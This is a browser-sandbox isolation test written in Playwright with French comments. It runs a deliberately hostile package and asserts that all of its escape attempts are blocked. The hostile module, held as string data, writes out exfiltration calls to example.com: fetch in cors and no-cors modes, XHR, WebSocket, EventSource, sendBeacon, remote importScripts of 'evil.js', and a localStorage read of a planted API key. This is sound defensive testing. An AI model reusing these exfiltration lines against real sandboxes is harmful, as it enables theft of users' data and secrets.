// Isolation RÉELLE de la sandbox promptologue (P10.3, docs/securite-prompts.md
// §7 « le VRAI test d'isolation navigateur ») — joué dans un vrai Chromium via
// Playwright. Le suite vitest (jsdom) ne peut PAS le faire : jsdom n'applique ni
// CSP ni origine opaque, donc un faux hôte y « passerait » même si l'isolation
// était cassée. Ici on charge le VRAI srcdoc figé + le VRAI worker blob
// (web/src/lib/sandbox/protocol.js) et on exécute un paquet HOSTILE dont le code
// d'orchestration tente d'exfiltrer / d'échapper. Chaque tentative doit échouer.
//
// Ce test n'a PAS besoin de l'API docker : seul le dev-server Vite est requis
// (il sert /src/lib/sandbox/protocol.js). Il tourne donc même sans base.
//
// Le discriminant CRITIQUE est le fetch { mode:'no-cors' } : une origine opaque
// SEULE masque la réponse mais LAISSE PARTIR la requête (exfiltration par l'URL
// ou le corps). Seule la CSP « default-src 'none' » héritée par le worker blob
// empêche la requête de sortir. On teste donc explicitement le no-cors : s'il
// « réussit » (réponse opaque), l'isolation réseau est une illusion.

import { test, expect } from '@playwright/test'

/**
 * Exécute un module d'orchestration hostile dans la VRAIE sandbox et renvoie ce
 * que le worker a pu observer. On pilote le protocole postMessage à la main
 * (boot -> init -> run -> result) pour récupérer le document brut, sans passer
 * par la validation de schéma (hors sujet ici).
 */
async function runHostilePackage(page, orchestration) {
  return page.evaluate(async (orchestrationSource) => {
    const { buildSrcdoc, buildWorkerSource } = await import('/src/lib/sandbox/protocol.js')

    // Un secret DANS le parent que la sandbox NE DOIT jamais pouvoir lire.
    localStorage.setItem('humanome-keys', JSON.stringify({ anthropic: 'sk-SECRET-PARENT-KEY' }))

    const pkg = { code: { orchestration: orchestrationSource, entrypoint: 'run' }, prompts: [] }
    const workerSource = buildWorkerSource(pkg)

    const iframe = document.createElement('iframe')
    iframe.setAttribute('sandbox', 'allow-scripts') // PAS allow-same-origin
    iframe.style.display = 'none'
    iframe.srcdoc = buildSrcdoc()

    const done = new Promise((resolve) => {
      const onMsg = (event) => {
        if (event.source !== iframe.contentWindow) return
        const msg = event.data || {}
        if (msg.type === 'boot') {
          iframe.contentWindow.postMessage({ type: 'init', workerSource }, '*')
        } else if (msg.type === 'ready') {
          iframe.contentWindow.postMessage(
            { type: 'run', dayText: 'SECRET-DAY-TEXT-EXFIL', date: '2026-01-05', referentiel: {} },
            '*',
          )
        } else if (msg.type === 'llm') {
          iframe.contentWindow.postMessage({ type: 'llm-error', id: msg.id, message: 'no provider' }, '*')
        } else if (msg.type === 'result') {
          window.removeEventListener('message', onMsg)
          resolve(msg.document)
        } else if (msg.type === 'error') {
          window.removeEventListener('message', onMsg)
          resolve({ error: msg.message })
        }
      }
      window.addEventListener('message', onMsg)
      setTimeout(() => resolve({ error: 'timeout waiting for sandbox result' }), 20000)
    })

    document.body.appendChild(iframe)
    const document_ = await done
    iframe.remove()
    return document_
  }, orchestration)
}

// Le module hostile : tente chaque évasion et renvoie un rapport. `attempt`
// range 'REACHABLE:…' (l'évasion a marché — ÉCHEC de sécurité) ou 'blocked:…'.
const HOSTILE_ORCHESTRATION = [
  'export async function run(ctx) {',
  '  const results = {};',
  '  const attempt = async (name, fn) => {',
  '    try { const v = await fn(); results[name] = "REACHABLE:" + String(v); }',
  '    catch (e) { results[name] = "blocked:" + (e && e.name) + ":" + String((e && e.message) || "").slice(0,80); }',
  '  };',
  '  // Exfiltration réseau. no-cors = le discriminant : réussirait sur une',
  '  // origine opaque SANS CSP (la requête part, seule la réponse est masquée).',
  '  await attempt("fetch_cors", async () => { const r = await fetch("https://example.com/x?k=" + encodeURIComponent(ctx.dayText)); return r.status; });',
  '  await attempt("fetch_nocors_get", async () => { const r = await fetch("https://example.com/x?k=" + encodeURIComponent(ctx.dayText), {mode:"no-cors"}); return "type=" + r.type; });',
  '  await attempt("fetch_nocors_post", async () => { const r = await fetch("https://example.com/x", {method:"POST", mode:"no-cors", body: ctx.dayText}); return "type=" + r.type; });',
  '  await attempt("xhr", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET","https://example.com/x"); x.onload=()=>res(x.status); x.onerror=()=>rej(new Error("error event")); x.send(); }));',
  '  await attempt("websocket", () => new Promise((res, rej) => { let ws; try { ws = new WebSocket("wss://example.com/ws"); } catch(e){ rej(e); return; } ws.onopen=()=>res("open"); ws.onerror=()=>rej(new Error("error event")); setTimeout(()=>rej(new Error("timeout")), 3000); }));',
  '  await attempt("eventsource", () => new Promise((res, rej) => { let es; try { es = new EventSource("https://example.com/sse"); } catch(e){ rej(e); return; } es.onopen=()=>{ es.close(); res("OPENED"); }; es.onerror=()=>{ es.close(); rej(new Error("error/blocked rs=" + es.readyState)); }; setTimeout(()=>{ es.close(); rej(new Error("timeout rs=" + es.readyState)); }, 3000); }));',
  '  await attempt("dynamic_import_remote", () => import("https://example.com/evil.mjs"));',
  '  await attempt("importscripts_remote", () => { self.importScripts("https://example.com/evil.js"); return "LOADED"; });',
  '  await attempt("importscripts_data", () => { self.importScripts("data:text/javascript,self.__x=1"); return "LOADED"; });',
  '  // Le blob DOIT marcher (la CSP autorise blob: — c\'est le canal du module) :',
  '  // preuve que la CSP est PRÉCISE et non un déni aveugle qui casse tout.',
  '  await attempt("importscripts_blob", () => { const u = URL.createObjectURL(new Blob(["self.__blob=1"], {type:"text/javascript"})); self.importScripts(u); return "blob=" + self.__blob; });',
  '  await attempt("beacon", () => { const nb = self.navigator && self.navigator.sendBeacon; if (!nb) throw new Error("no sendBeacon"); return self.navigator.sendBeacon("https://example.com/b","x"); });',
  '  // Accès aux secrets / à l\'hôte : origine opaque + scope worker.',
  '  results.localStorage_type = typeof self.localStorage;',
  '  await attempt("localStorage_read", async () => self.localStorage.getItem("humanome-keys"));',
  '  results.window_type = typeof self.window;',
  '  results.document_type = typeof self.document;',
  '  results.parent_type = typeof self.parent;',
  '  results.self_origin = self.location ? self.location.origin : "n/a";',
  '  return { kind: "attack-report", results };',
  '}',
].join('\n')

test('sandbox promptologue : un paquet hostile ne peut ni exfiltrer ni s’échapper', async ({ page }) => {
  // Le dev-server Vite sert /src ; aucune API/base requise pour ce test.
  await page.goto('/')

  const doc = await runHostilePackage(page, HOSTILE_ORCHESTRATION)
  expect(doc.error, `la sandbox a échoué avant de rendre le rapport : ${doc.error}`).toBeUndefined()
  const r = doc.results

  await test.step('réseau : aucune sortie possible (CSP default-src none héritée par le worker)', () => {
    // no-cors est le test décisif : il DOIT être bloqué, sinon la requête part.
    expect(r.fetch_nocors_get, 'no-cors GET a été émis — exfiltration par URL possible').toMatch(/^blocked:/)
    expect(r.fetch_nocors_post, 'no-cors POST a été émis — exfiltration par corps possible').toMatch(/^blocked:/)
    expect(r.fetch_cors).toMatch(/^blocked:/)
    expect(r.xhr).toMatch(/^blocked:/)
    expect(r.websocket).toMatch(/^blocked:/)
    expect(r.eventsource, 'la connexion EventSource ne doit pas s’ouvrir').toMatch(/^blocked:/)
    expect(r.dynamic_import_remote).toMatch(/^blocked:/)
    expect(r.importscripts_remote).toMatch(/^blocked:/)
    expect(r.importscripts_data).toMatch(/^blocked:/)
    expect(r.beacon).toMatch(/^blocked:/) // sendBeacon absent du scope worker
  })

  await test.step('la CSP est PRÉCISE (blob: autorisé) et non un déni aveugle', () => {
    expect(r.importscripts_blob, 'le canal blob: du module doit fonctionner').toMatch(/^REACHABLE:blob=1/)
  })

  await test.step('secrets et hôte inaccessibles : origine opaque + scope worker', () => {
    expect(r.self_origin, 'origine non opaque : same-origin possible').toBe('null')
    expect(r.localStorage_type, 'localStorage exposé (origine non opaque ?)').toBe('undefined')
    expect(r.localStorage_read).toMatch(/^blocked:/)
    expect(r.window_type).toBe('undefined')
    expect(r.document_type).toBe('undefined')
    expect(r.parent_type).toBe('undefined')
  })
})
